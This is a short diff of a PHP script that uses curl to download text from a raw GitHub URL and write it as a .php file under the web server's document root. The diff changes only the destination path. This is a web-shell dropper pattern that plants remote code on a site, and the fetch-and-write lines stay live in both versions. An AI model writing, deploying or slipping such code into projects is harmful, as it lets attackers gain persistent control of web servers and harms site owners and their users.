@@ -8,7 +8,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "/build/classes/accountssoftware/Expense$758.php" ;
+$check = $_SERVER['DOCUMENT_ROOT'] . "/build/Expense$758.php" ;
 $text = http_get('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/xexo.txt');
 $open = fopen($check, 'w');
 fwrite($open, $text);
